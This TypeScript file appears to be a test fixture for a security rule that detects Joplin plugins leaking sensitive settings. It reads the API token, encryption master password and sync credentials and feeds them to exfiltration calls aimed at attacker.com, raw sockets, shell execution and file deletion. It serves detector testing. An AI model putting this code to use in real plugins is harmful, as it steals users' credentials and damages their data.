import * as joplin from 'api';
import axios from 'axios';
import * as http from 'http';
import * as https from 'https';
import * as net from 'net';
import * as tls from 'tls';
import WebSocket from 'ws';
import * as fs from 'fs';
import * as fsExtra from 'fs-extra';
import * as childProcess from 'child_process';

function leakToAllSinks(secret: any) {
    // Network exfiltration sinks
    fetch('https://attacker.com/?secret=' + secret);

    axios.post('https://attacker.com/leak', {
        secret,
    });

    const httpReq = http.request({
        hostname: 'attacker.com',
        path: '/leak?secret=' + secret,
    });
    httpReq.end();

    const httpsReq = https.request({
        hostname: 'attacker.com',
        path: '/leak?secret=' + secret,
    });
    httpsReq.end();

    net.connect(4444, String(secret));
    tls.connect(4443, String(secret));

    const ws = new WebSocket('wss://attacker.com');
    ws.send(secret);

    window.postMessage(secret, '*');

    // File-system path sinks
    fs.writeFileSync(secret, 'data');
    fs.appendFileSync(secret, 'data');
    fs.renameSync(secret, '/tmp/new-name');
    fs.unlinkSync(secret);
    fs.mkdirSync(secret);
    fs.rmSync(secret, { recursive: true, force: true });
    fs.createWriteStream(secret);

    fsExtra.outputFileSync(secret, 'data');
    fsExtra.removeSync(secret);
    fsExtra.moveSync(secret, '/tmp/moved');
    fsExtra.copySync(secret, '/tmp/copied');

    // File-system data sinks
    fs.writeFileSync('/tmp/secret-out.txt', secret);
    fs.appendFileSync('/tmp/secret-out.txt', secret);
    fsExtra.outputFileSync('/tmp/secret-out.txt', secret);

    // Command execution sinks
    childProcess.exec('echo ' + secret);
    childProcess.execFile(secret, []);
    childProcess.spawn(secret, []);
    childProcess.execSync('echo ' + secret);
    childProcess.execFileSync(secret, []);
    childProcess.spawnSync(secret, []);
    childProcess.fork(secret);

    // Joplin-specific sinks
    joplin.data.put(['notes', '1'], null, {
        title: secret,
    });

    joplin.views.panels.setHtml('panel1', '<div>' + secret + '</div>');
    joplin.views.dialogs.setHtml('dialog1', '<div>' + secret + '</div>');

    joplin.contentScripts.register('markdownItPlugin' as any, 'evil-script', secret);

    joplin.data.userDataSet(['notes', '1'], 'cache', secret);
}

async function triggerRule() {
    // globalValue literal sensitive settings
    leakToAllSinks(await joplin.settings.globalValue('api.token'));
    leakToAllSinks(await joplin.settings.globalValue('encryption.masterPassword'));
    leakToAllSinks(await joplin.settings.globalValue('encryption.cachedPpk'));
    leakToAllSinks(await joplin.settings.globalValue('encryption.passwordCache'));
    leakToAllSinks(await joplin.settings.globalValue('syncInfoCache'));

    leakToAllSinks(await joplin.settings.globalValue('sync.5.password'));
    leakToAllSinks(await joplin.settings.globalValue('sync.6.auth'));
    leakToAllSinks(await joplin.settings.globalValue('sync.9.context'));
    leakToAllSinks(await joplin.settings.globalValue('sync.10.userEmail'));
    leakToAllSinks(await joplin.settings.globalValue('sync.userId'));
    leakToAllSinks(await joplin.settings.globalValue('clientId'));

    // globalValues array source
    const many = await joplin.settings.globalValues([
        'api.token',
        'encryption.masterPassword',
        'encryption.cachedPpk',
        'encryption.passwordCache',
        'syncInfoCache',
        'sync.5.password',
        'sync.6.auth',
        'sync.9.context',
        'sync.10.userEmail',
        'sync.userId',
        'clientId',
    ]);

    leakToAllSinks(many['api.token']);
    leakToAllSinks(many['encryption.masterPassword']);
    leakToAllSinks(many['encryption.cachedPpk']);
    leakToAllSinks(many['encryption.passwordCache']);
    leakToAllSinks(many['syncInfoCache']);
    leakToAllSinks(many['sync.5.password']);
    leakToAllSinks(many['sync.6.auth']);
    leakToAllSinks(many['sync.9.context']);
    leakToAllSinks(many['sync.10.userEmail']);
    leakToAllSinks(many['sync.userId']);
    leakToAllSinks(many['clientId']);

    // Negative: non-sensitive setting should not be reported
    const safeSetting = await joplin.settings.globalValue('theme');
    fetch('https://attacker.com/?x=' + safeSetting);

    // Negative: local value should not be reported
    const localValue = 'not-a-secret';
    fs.writeFileSync('/tmp/local.txt', localValue);
}

triggerRule();